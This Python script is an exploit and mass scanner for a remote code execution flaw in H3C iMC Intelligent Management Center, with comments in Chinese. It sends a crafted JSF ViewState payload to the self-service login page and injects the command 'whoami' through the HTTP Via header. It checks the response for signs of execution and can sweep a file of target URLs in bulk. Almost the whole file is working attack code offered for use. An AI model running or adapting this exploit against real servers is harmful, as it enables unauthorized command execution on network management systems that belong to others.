import requests
import argparse

def IMC(url):
    create_url = url+"/selfservice/login.jsf" #构造请求的URL地址

    data = '''javax.faces.ViewState=8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq%2b4sy0rUOuOdM5ccd2J6LPx8c6%2b53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU%2burahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm%2bwbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG%2bGMrGWFL5%2bwFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl%2bPpEua%2b28h2YCKipVb5S/wOCrg%2bKD3DUFCbdWHQRqDaZyvYsc8C0X7fzutiVUlSB7OdGoCjub9WuW0d2eeDWZmOt3Wunms3SwAbE7R%2bonCRVS8tiYWF8qiQS%2bl0k8Gw/Hz6Njpfe0upLIAtPFNDuSf69qGg4isEmY2FtoSQTdD8vU0BdJatHrBArPgo9Qsp0jSJBlUz2OqteQg05PYO6gEBXVj/RiTBHI1/pOzlcE0wVZcLUHnxGNvckSCTiT....nWbkWGJ8AYCvrM0PHZ/BYcKKRf3rMHoIqcAN%2bORMhXcmAXRcvq29c5xqoOuvrMSJPDZmbZhcm/99crGJSO5HxXQder9WKm2tVBaDLEC9ulpWyICJYgfxayoWkt6vwPcq2Tn20vn5RDpfqJKLNLbrV8g7JDRUUyW%2b....R6PRNunKhfJHvHcXAZ73mkCUf7cMUbNhqCbLSGP/D%2bqpqWXk5ZWjsT4tQ9tFH9uvPIaNB7FlcFXI2I2A9oPoY0ltif%2bb8BdPXVfpuZq8boHE4hY%2b33BIl%2bIa%2bov6nyMmGIzCKYeRbfDJtk/45EXvink6BIgA/205la6vvqKTGQ32o1AtepBgKei....604cVvbEP7UKor09Gz61mryE4D%2biXG1prZGCT3LEtdASuCkmf4RTEc5wks2In3ElZSZl8zf3RsHA0dgbvrpnXe2wLPI%2bUCAGO%2biOG9/%2bbCQJQNFmykkyRbmslfcilUxZ%2bIg%2bQuOs9FlMod2ICrkktOFFeZWNeznx737S8H4Nf2%2bp2QNHY2I6GFGtWpqjeZ%2bGmb1euM5Tzi06eJ.......koPrjkDT9VPoxCgpRMQl06x7NShkos7BCI9fV1%2b17t5gWZvqAYzeQUsZLaiBXaZfuUtPuBmbq1re/dB/VgSOn4QX%2b8AwwDjtfazsHw4aIdh4e2a1y/Ou2ZiI//EzkwIBksY6CluuPgocdvtOfNiWcXsfYs3UKLmL/48A4Ls0OF1TrQK4UnfCYt.....1DGrwzfXnM9vLHznFaJenqvLY3yTiKN5SSVxvGwvhmp6PFW4Jj7G8NXdr/zN7HyC9Eg1Y1jKP7uiO%2bGM2U/etvMOCKwnfP2MnbznP378fZHf1H9yiVVrn%2bm%2b0u8PV.....2MsOTgS6B7C8ItflgSfJz5dkJ8IssRAcY%2bu/2QjrW95BBMSRPu2EaCUm1IpuszXEwHYgDizWPzDB0hSRgCEjncpGhPX3i10bK4/snBaBcAxAa1e2er2LDe/4WgaIwc9w2wKn3wXY5B87BKF5/Xq30....NNf6EMRrQ9154rEkCJb4IU4sFsTuyYlfZatlV%2bC2HM7u7FEbdVvr6yYK4oQqvfPmF5yRplwAYUQAvr1jwLbGYxhGaTy14UUrtvoyph5Sqebk2YTKjKX4U7xX5ha4YbyoVIMSRzdvB6YXDY3BId%2bgmMWZtTf2UE%2b9UAx/7g30pQNXA....FP1adq6ySd4x3dGVCe4YJcYe2gKWYVcWj5XPwUSt2fxdshzgFnjjqmRgxowH2u2nZU0xG539lnxIOlB'''
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36",
             "Content-Type":"application/x-www-form-urlencoded",
             "Via":"whoami"}
    # 构造请求数据与请求头中的部分内容，其中造成命令执行的是请求头中Via参数

    try:
        req=requests.post(create_url,data=data,headers=headers,timeout=5)
        if(req.status_code==200):
            if "system" in req.text:
                print(f"{url}存在关于IMC智能管理中心的RCE漏洞")
                # print(req.text) #显示该请求发送后响应包返回的内容
            else:
                print("该网址不存在相关漏洞")
    except:
        print("该网址无法访问")

def IMC_counts(filename):
    try:
        with open(filename,"r") as file:
            readline = file.readlines()
            for urls in readline:
                urls = urls.strip()
                IMC(urls)
    except:
        print("文件不存在或文件打开发生错误")

def start():
    logo=''' ██╗  ██╗██╗  ██╗ ██████╗       ██████╗ ██╗  ██╗██████╗  ██████╗ ██╗███╗   ███╗ ██████╗
██║  ██║██║  ██║██╔════╝       ╚════██╗██║  ██║╚════██╗██╔════╝ ██║████╗ ████║██╔════╝
███████║███████║███████╗ █████╗ █████╔╝███████║ █████╔╝██║█████╗██║██╔████╔██║██║     
██╔══██║╚════██║██╔═══██╗╚════╝██╔═══╝ ██╔══██║ ╚═══██╗██║╚════╝██║██║╚██╔╝██║██║     
██║  ██║     ██║╚██████╔╝      ███████╗██║  ██║██████╔╝╚██████╗ ██║██║ ╚═╝ ██║╚██████╗
╚═╝  ╚═╝     ╚═╝ ╚═════╝       ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝ ╚═════╝
                                                                                      


'''
    print(logo)
    print("wirten by YZX100")
    
def main():
    parser = argparse.ArgumentParser(description="H46-2H3C-iMC智能管理中心-RCE")
    parser.add_argument('-u', type=str, help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        IMC(args.u)
    elif args.f:
        IMC_counts(args.f)
    else:
        parser.print_help()

if __name__ == "__main__":
    start()
    main()
